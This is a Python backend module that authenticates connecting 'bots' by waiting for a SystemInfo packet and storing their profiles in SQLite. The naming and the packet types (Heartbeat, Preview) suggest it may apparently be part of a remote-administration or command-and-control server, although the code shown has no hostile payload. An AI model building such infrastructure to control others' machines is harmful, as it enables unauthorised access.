# backend/Services/Auth.py

import asyncio
import time
from typing import Any, Dict, Optional, Tuple

import backend.LoggerWrapper as logger
from backend.Database import db_get_bots, db_update_bot
from .network import NetworkProtocol

AUTH_TIMEOUT_SECONDS: float = 15.0
PACKET_READ_TIMEOUT_SECONDS: float = 5.0
LOCAL_IP_ADDRESSES: list = ["0.0.0.0", "127.0.0.1", None]
FORBIDDEN_VALUES: list = [None, "", "??", "Loading...", "Idle", "Initializing"]
PASSPORT_MODULE_NAME: str = "SystemInfo"


async def authorize_bot(
    reader: asyncio.StreamReader,
    ip_address: str
) -> Optional[Tuple[str, Dict[str, Any]]]:
    """
    Выполняет первичную идентификацию бота по протоколу V8.0.
    Ожидает пакет [SystemInfo:json:none:none].
    Игнорирует другие пакеты (Heartbeat, Preview), если они пришли раньше авторизации.
    [HEADER: 8b] + [ID] + [SystemInfo:json:none:none] -> Body
    """
    try:
        start_time_stamp = time.time()

        while (time.time() - start_time_stamp) < AUTH_TIMEOUT_SECONDS:
            packet_data = await asyncio.wait_for(
                NetworkProtocol.read_packet(reader),
                timeout=PACKET_READ_TIMEOUT_SECONDS
            )

            bot_identifier, metadata, payload = packet_data

            if not bot_identifier or not metadata:
                continue

            if metadata.get("module") == PASSPORT_MODULE_NAME:
                if isinstance(payload, dict):
                    if payload.get("ip") in LOCAL_IP_ADDRESSES:
                        payload["ip"] = ip_address

                    bot_full_profile = sync_bot_data(bot_identifier, payload)

                    logger.Log.success(f"[Auth] Bot '{bot_identifier}' authorized successfully")
                    return bot_identifier, bot_full_profile

                logger.Log.warning(f"[Auth] SystemInfo received but payload is not a dict from {ip_address}")
            else:
                logger.Log.debug(f"[Auth] Skipping early packet '{metadata.get('module')}' from {ip_address}")

    except asyncio.TimeoutError:
        logger.Log.debug(f"[Auth] Authorization timeout for {ip_address}")
    except Exception as exception_instance:
        logger.Log.error(f"[Auth] Critical Error during authorization: {exception_instance}")

    return None


def sync_bot_data(bot_identifier: str, payload: Dict[str, Any]) -> Dict[str, Any]:
    """
    Обновление профиля бота в SQLite с очисткой данных.
    [Payload: Dict] -> SQLite Update
    """
    all_bots_collection = db_get_bots()
    bot_profile = all_bots_collection.get(bot_identifier, {"id": bot_identifier})

    sanitized_payload = {
        key: value for key, value in payload.items()
        if value not in FORBIDDEN_VALUES
    }

    bot_profile.update(sanitized_payload)
    bot_profile["status"] = "online"

    db_update_bot(bot_identifier, bot_profile)

    return bot_profile